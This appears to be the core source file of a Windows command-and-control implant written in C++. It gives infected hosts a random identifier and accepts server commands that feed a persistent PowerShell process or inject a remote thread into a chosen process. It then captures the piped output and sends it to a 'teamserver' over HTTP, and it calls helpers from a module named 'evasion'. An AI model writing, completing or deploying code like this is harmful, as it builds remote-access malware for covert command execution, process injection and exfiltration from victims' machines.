#include <iostream>
#include <vector>
#include <string>
#include <codecvt>
#include "Windows.h"
#include "wincrypt.h"
#include "base64.h"
#include "dependencies.h"
#include "evasion.h"
#include "core.h"
#include "HttpCommunicator.h"

// TBD: This could lead to buffer overflows -> check if it is enough
#define BUFSIZE 4096

// UTF-8 regex
#define UTF8_DETECT_REGEXP  "^([\x09\x0A\x0D\x20-\x7E]|[\xC2-\xDF][\x80-\xBF]|\xE0[\xA0-\xBF][\x80-\xBF]|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}|\xED[\x80-\x9F][\x80-\xBF]|\xF0[\x90-\xBF][\x80-\xBF]{2}|[\xF1-\xF3][\x80-\xBF]{3}|\xF4[\x80-\x8F][\x80-\xBF]{2})*$"

core* core::instance = NULL;
bool core::terminated = false;
PROCESS_INFO* core::persistent_process = NULL;
int core::sleepTime = 5;



///////////////////// UTILS /////////////////////
bool extract_argument(std::string fullCommand, std::string mainCommand, std::string& aux) {
	int mainCommandSize = mainCommand.length() + 1;
	if (fullCommand.rfind(mainCommand, 0) == 0) {
		aux = fullCommand.substr(mainCommandSize, fullCommand.size() - mainCommandSize);
		aux += "\n";
		return true;
	}
	return false;
}

///////////////////// CLASS IMPLEMENTATIONS /////////////////////
core::core() {
	HCRYPTPROV hCryptProv;
	
	// we can use any number of bytes, 128 just feels perfect
	int bufLength = 128;
	BYTE * buf = (BYTE*)malloc(bufLength *sizeof(BYTE));

	// get the Crypto Context
	if (!CryptAcquireContext(
		&hCryptProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		std::cout << "[!] ERROR: CryptAcquireContext " << GetLastError() << std::endl;
	}

	// generate 128 random bytes
	if (!CryptGenRandom(hCryptProv, (DWORD) bufLength, buf)) {
		std::cout << "[!] ERROR: CryptGenRandom " << GetLastError() << std::endl;
	}

	// encode bytes base64
	std::string base64EncodedIdentifier = base64::encode(buf, bufLength);
	// sanitize identifier from anything non-alpha-numeric (we will use it in the URL param)
	base64EncodedIdentifier = dependencies::sanitize_identifier(base64EncodedIdentifier);

	// erase the heap
	if(buf!=NULL)
		free(buf);

	// we will assign the identifier
	this->identifier = base64EncodedIdentifier;
	core::instance = this;
}

core::core(std::string identifier) {
	this->identifier = identifier;
	core::instance = this;
}

void core::execute_command(std::string cmd){
	// Some cases:
	// "shell " + anything => spawns and executes a CMD.exe command (fork & run)
	// "powershell " + anything => spawns and executes a POWERSHELL.exe command (fork & run)
	// more will come soon1
	std::string finalCmd = "";

	if (extract_argument(cmd, "pwrsh", finalCmd)) {
		evasion::send_command(finalCmd.c_str(), core::persistent_process->stdIn);
	}

	if (extract_argument(cmd, "inject", finalCmd)) {
		evasion::inject_remote_thread(atoi(finalCmd.c_str()));
	}

	if (cmd == "exit") {
		core::terminated = true;
	}
}

bool core::invalid_char(char c)
{
	return !(c >= 0 && c < 128);
}

void core::read_pipe(HANDLE rdPipe) {
	DWORD dwRead;
	BYTE chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	std::string completeResult = "";

	DWORD avail;
	BOOL tSuccess = PeekNamedPipe(rdPipe, NULL, 0, NULL, &avail, NULL);

	if (!tSuccess || avail == 0)
		return;

	for (;;)
	{
		bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;
		
		char str[(sizeof chBuf) + 1];
		memcpy(str, chBuf, sizeof chBuf);
		str[sizeof chBuf] = 0; // Null termination.

		std::string tempResult(str);
		completeResult += tempResult;
		Sleep(500);
		//core::communicator->send_output();
		// Send response to teamserver

		if (!bSuccess) break;
	}
	completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), core::invalid_char), completeResult.end());

	// we will assume HTTP always for now
	if(HttpCommunicator::communicator)
		HttpCommunicator::communicator->send_output(completeResult);
}

void core::read_pipe_once(HANDLE rdPipe) {
	DWORD dwRead;
	BYTE chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	std::string completeResult = "";

	DWORD avail;
	BOOL tSuccess = PeekNamedPipe(rdPipe, NULL, 0, NULL, &avail, NULL);

	if (!tSuccess || avail == 0)
		return;

	bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);

	char str[(sizeof chBuf) + 1];
	memcpy(str, chBuf, sizeof chBuf);
	str[sizeof chBuf] = 0; // Null termination.

	std::string tempResult(str);
	completeResult += tempResult;

	if (completeResult != "") {
		completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), core::invalid_char), completeResult.end());

		// we will assume HTTP always for now
		if (HttpCommunicator::communicator)
			HttpCommunicator::communicator->send_output(completeResult);
	}
}
